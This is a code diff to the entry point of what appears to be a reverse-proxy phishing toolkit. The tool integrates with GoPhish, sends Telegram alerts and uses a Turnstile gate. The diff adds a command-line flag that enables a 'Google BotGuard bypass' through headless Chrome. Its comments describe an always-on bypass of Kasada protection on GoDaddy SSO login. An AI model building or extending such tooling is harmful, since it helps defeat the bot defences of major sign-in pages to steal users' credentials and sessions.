@@ -29,6 +29,7 @@ var feed_enabled = flag.Bool("feed", false, "Auto-enable EvilFeed integration on
 var gophish_db_path = flag.String("g", "", "Path to GoPhish database file (e.g., /path/to/gophish.db)")
 var telegram_config = flag.String("telegram", "", "Auto-enable Telegram notifications with format: <bottoken>:<chatid>")
 var turnstile_config = flag.String("turnstile", "", "Auto-enable Turnstile verification with format: <sitekey>:<secretkey>")
+var google_bypass = flag.Bool("google-bypass", false, "Enable Google BotGuard bypass (Chrome headless required)")
 
 func joinPath(base_path string, rel_path string) string {
 	var ret string
@@ -48,17 +49,19 @@ func showAd() {
 	log.Info("%s", message)
 }
 
-// NOTE: Google and GoDaddy bypasses are ALWAYS ACTIVE when Chrome is running on port 9222
+// NOTE:
+// - GoogleBypasser: MANUAL ACTIVATION via --google-bypass flag (for legacy Google flows)
+// - KasadaBypasser: ALWAYS ACTIVE for GoDaddy SSO (sso.godaddy.com)
 // Chrome is started automatically by start.sh (start_chrome_headless function)
-// No flags needed - the bypass code in http_proxy.go triggers automatically based on URL patterns
 
 func init() {
 	flag.Parse()
 	// Chrome headless is now started by start.sh script (start_chrome_headless function)
-	// This ensures Chrome is available for both GoogleBypasser and KasadaBypasser
-	// The bypass code in http_proxy.go will automatically trigger when:
-	// - GoogleBypasser: accounts.google.com + specific batchexecute URL
-	// - KasadaBypasser: sso.godaddy.com + /v1/api/pass/login
+	// GoogleBypasser: Only triggers when --google-bypass flag is set
+	// KasadaBypasser: Auto-triggers for sso.godaddy.com + /v1/api/pass/login
+	if *google_bypass {
+		log.Info("[GoogleBypasser] Enabled via --google-bypass flag")
+	}
 }
 
 func getenv(key, fallback string) string {
@@ -148,6 +151,12 @@ func main() {
 		return
 	}
 	cfg.SetRedirectorsDir(*redirectors_dir)
+
+	// Set Google Bypass flag from command line
+	if *google_bypass {
+		cfg.SetGoogleBypassEnabled(true)
+		log.Info("[GoogleBypasser] Enabled via --google-bypass flag")
+	}
 
 	db, err := database.NewDatabase(filepath.Join(*cfg_dir, "data.db"))
 	if err != nil {
